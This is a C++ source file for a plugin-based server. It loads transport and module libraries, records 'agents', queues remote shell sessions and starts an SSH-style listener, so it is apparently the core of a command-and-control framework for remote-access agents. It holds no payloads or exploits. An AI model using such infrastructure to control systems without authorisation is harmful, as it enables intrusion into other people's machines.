#include "server.h"

/* Global variables and data structures */
Server *server;

/* handy little print function for debugging pClientDat structures */
void print_clientDat(pClientDat str){
    printf("\n\nID: %s\n", str->id);
    printf("Type: %d\n\n\n", str->type);
}

/* Constructs a server object*/
Server::Server(){

    // initialize all of the vectors and queues needed 
    this->sessions = new std::vector<pthread_t>(0);
    this->api_handles = new std::vector<ptransport_t*>(0);
    this->module_handles = new std::vector<void (*)()>(0);
    this->shared_lib_handles = new std::vector<void *>(0);
    this->handle_ids = new std::vector<int>(0);
    this->handle_names = new std::vector<const char *>(0);
    this->shell_queue = new std::queue<ConnectionInstance *>();
    this->logger = new Log();

    int ret;
    char* last;
	char result[4096];
    char dir[4096];
    unsigned long index;
    struct stat st = {0};
    
    
    memset(result, 0, sizeof(result));
	memset(dir, 0, sizeof(dir));
	
    // seed random number generator
    srand(time(NULL));

	// gets current file path, so data will be written to correct folder regardless of where execution is called
	readlink( "/proc/self/exe", result, 4096);

	last = strrchr(result, '/');
	index = last - result;
	strncpy(dir, result, index);
	
    // change to executable's home directory 
	ret = chdir(dir);
	if(ret < 0){
		perror("Failed to change directory");
		exit(-1);
	}

    // reset umask so we have full control of permissions
    umask(0);

    // initialize base directories
    if (stat("agents", &st) == -1) {
        mkdir("agents", 0755);
        printf("Server: initialized directory 'agents'\n");
    }

    if (stat("out", &st) == -1) {
        mkdir("out", 0755);
        printf("Server: initialized directory 'out'\n");
    }

    if (stat("agents/agents.dat", &st) == -1) {
        int fd2 = open("agents/agents.dat", O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
        printf("Server: initialized agent authentication file\n");
        close(fd2);
    }
}

/* Starts a new listening thread using the `transport` backend on `port`*/
int Server::listen_instance(ptransport_t transport, int port){
    pthread_t thread;
    // pass connection to handler thread

    this->sessions->push_back(thread);
    int *args = (int*)malloc(sizeof(int) * 3);
    args[0] = transport->get_id();
    args[1] = port;
            
    // create thread
    if(pthread_create(&thread, NULL, init_instance, (void*)args)){
        printf("Error creating thread\n");
        return 1;
    }
    
    return 0;
}

/* Starts a new listening thread using a transport with id `transport_id` on `port`*/
int Server::listen_instance(int transport_id, int port){
    pthread_t thread;

    this->sessions->push_back(thread);

    int *args = (int*)malloc(sizeof(int) * 3);
    args[0] = transport_id;
    args[1] = port;
            
    // create thread
    if(pthread_create(&thread, NULL, init_instance, (void*)args)){
        printf("Error creating thread\n");
        return 1;
    }

    return 0;
}

/* Returns the queue of available remote shell sessions */
std::queue<ConnectionInstance *> *Server::get_shell_queue(){
    return this->shell_queue;
}

/* Returns the vector of available transport apis */
std::vector<ptransport_t*> *Server::get_api_handles(){
    return this->api_handles;
}

/* Returns the vector of available handle IDs*/
std::vector<int> *Server::get_handle_ids(){
    return this->handle_ids;
}

/* Returns the vector of available hanle names*/
std::vector<const char *> *Server::get_handle_names(){
    return this->handle_names;
}

/* Adds `transport` as an available transport API*/
void Server::add_transport_api(ptransport_t *transport, const char *name, int id){
    this->api_handles->push_back(transport);
    printf("Name addr: %p\n", name);
    this->handle_names->push_back(name);
    this->handle_ids->push_back(id);
}

/* Adds `entrypoint` to available modules */
void Server::add_module(void (*entrypoint)(), const char *name, int id){
    this->module_handles->push_back(entrypoint);
    this->handle_names->push_back(name);
    this->handle_ids->push_back(id);
}

/* Reloads all available modules */
void Server::reload_backends(){
    DIR *dir;
    struct dirent *ent;
    char *buff = (char*)malloc(2048);

    // clear the current vectors
    this->api_handles->clear();
    this->module_handles->clear();
    this->handle_ids->clear();
    this->handle_names->clear();

    // close all currently open dl handles 
    for(void *handle : *(this->shared_lib_handles)){
        dlclose(handle);
    }
    this->shared_lib_handles->clear();

    // open modules directory 
    if ((dir = opendir ("shared/")) != NULL) {

        // loop over each module
        while ((ent = readdir (dir)) != NULL) {

            // ignore current and parent dir entries 
            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                continue;
            } else {

                // get module path
                memset(buff, 0, 2048);
                sprintf(buff, "./shared/%s", ent->d_name);
                
                // open the module and handle the instance
                void *handle = dlopen(buff, RTLD_NOW);
                if(!handle) {
                    printf("Failed to load .so file: %s\n", dlerror());    
                    continue;
                }

                Server::handle_instance(server, handle, true);
                printf("Added api to server\n");
            }
        }
    } else {
        // Failed to open directory 
        printf("[Loader] Failed to open target directory 'shared/'\n");
        perror ("");
    }

    // close handle and return
    closedir (dir);
    return;
}

/* Handles the use of a module handle */
void *Server::handle_instance(class Server* server, void *handle, bool reload){

    // check if the handle is not null
    if(!handle) {
        server->log("Broken handle found. Skipping...\n", "SERVER");
        return nullptr;
    }
    
    // add handle to library handles
    server->shared_lib_handles->push_back(handle);

    // get required global constants from the handle
    const int type = *(const int *)dlsym(handle, "type");
    const int id = *(const int *)dlsym(handle, "id");
    const char *name = *(const char **)dlsym(handle, "name");

    // check if they worked
    if(!type) {
        printf("[Loader] Failed to find type symbol\n");
        return NULL;
    }
    else printf("[Loader] Detected object type '%d'\n", type);
    
    if (!id){
        printf("[Loader] Failed to locate the module's ID\n");
        return NULL;
    }
    if (!name){
        printf("[Loader] Failed to locate the module's name\n");
        return NULL;
    }
            

    ptransport_t *api = new ptransport_t;
    void (*entrypoint)();
    void *ret = NULL;
    
    // handle the different module types 
    switch(type){
        case MODULE:
            printf("[Loader] Detected module type\n");
            
            // resolve entrypoint and add it to the available module_handles vector 
            entrypoint = (void (*)())dlsym(handle, "entrypoint");
            if (!entrypoint){
                printf("[Loader] Failed to locate the module's entrypoint function");
                break;
            }

            server->module_handles->push_back(entrypoint);
            printf("Added module entrypoint\n");

            // dont execute entrypoint if we are reloading backends
            if(!reload){
                (*entrypoint)();
            }
            break;
        case TRANSPORT:
            printf("[Loader] Detected transport type\n");

            // resolve transport API and add it to available transport APIs
            *api = (ptransport_t)dlsym(handle, "transport_api");
            if(!api) {
                printf("[Loader] Failed to find transport API structure\n"); 
                break;
            }
            server->add_transport_api(api, name, id);
            ret = api;
            break;

        default:
            // unknown module type
            printf("[Loader] Unknown type: %d\n", type);
            break;
    }
    return ret;
}

/* Adds `handle` to available shared library handles*/
void Server::add_handle(void *handle){
    this->shared_lib_handles->push_back(handle);
}

/* Retrieves the module ID from `handle`*/
int get_id_from_handle(void *handle){
    const int type = *(const int *)dlsym(handle, "type");
    
    return type;
}

/* Retrieves the module name from `handle`*/
char *get_name_from_handle(void *handle){

    /*
    UNIMPLEMNENTED
    */
    return nullptr;
}

/* Thread worker which initializes a listening backend or module */
void *init_instance(void *args){

    // get arguments from passed generic data
    int *passed_args = (int*)args;
    int transport_id = passed_args[0];
    int port = passed_args[1];
    bool found = false;
    bool is_module = false;
    ptransport_t* api;

    class ConnectionInstance *instance = new ConnectionInstance();
    std::vector<ptransport_t*> *apis = server->get_api_handles();

    // loop over all available transport API handles
    for(size_t i = 0; i < apis->size(); i++){
        api = apis->at(i);
        int tmp_id = (*api)->get_id();

        // checks if its the backend we want 
        if(tmp_id == transport_id){
            printf("[Loader Found transport with correct ID\n");

            // Sets the transport 
            instance->set_transport(*api);
            found = true;
            break;
        }
    }

    ptransport_t *new_api;

    // if we couldnt find the api currently loaded,
    // look through all apis in the folder
    if(!found){
        char buff[BUFSIZ];
        char path[PATH_MAX];
        sprintf(buff, "%s/shared", getcwd(path, sizeof(path)));
        DIR *dir;
        struct dirent *ent;

        if((dir = opendir(buff)) != NULL){
            while((ent =readdir(dir)) != NULL){
                // ignores current and parent dir entries 
                if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
                    continue;
                } else {

                    // attempt to open the handle
                    void *handle = dlopen(ent->d_name, RTLD_NOW);
                    if(!handle) {
                        continue;
                    }
    
                    // attempt to resolve the ID 
                    int id_sym = *(int *)dlsym(handle, "id");
    
                    // check if its what we want
                    if(id_sym == transport_id){
                        found = true;
                        new_api = (ptransport_t *)Server::handle_instance(server, handle, false);
                        instance->set_transport(*new_api);
                        
                    }
                    // otherwise close handle and continue
                    else dlclose(handle);
                }
            }
        }
    
        // close directory handle
        closedir(dir);
    }
    
    // Check if we found the target API
    if(!found){
        printf("[Loader] Could not find transport with corresponding ID '%d'\n", transport_id);
        return nullptr;

        // check if we loaded a module
    } else if (is_module){
        printf("[Loader] module run\n");

    } else {
        // initialize the transport's instance data
        if(!instance->api_check(instance->get_transport()->get_dat_siz())){
            return nullptr;
        }
        void *data = malloc((int)instance->api_data);
        memset(data, 0, (int)instance->api_data);

        //instance->init_data(&data);
        instance->get_transport()->init(data);

        // sets the listening port of the transport
        instance->get_transport()->set_port(data, port);

        // last minute assignments and connection handoff to instance
        instance->set_server(server);
        instance->set_data(data);


        //printf("[Loader] Transport ptr: %p\n", instance->get_transport());
        instance->handle_connection();
    }
    return nullptr;
}

/*Funny enough, this is the main function*/
int main(int argc, char **argv){
    // TODO: UPDATE SIGHANDLERS TO MODERN STUFF

    // initialize variables
    server = new Server();

    // load all available backends and modules
    server->reload_backends();
        
    // listen on an SSH Transport instance on the default port 
    server->listen_instance(55, 0);
    
    // Do nothing...
    while(1){
        sleep(1);
    }
    
    printf("Server: Terminated successfully\n");
    return 0;
}

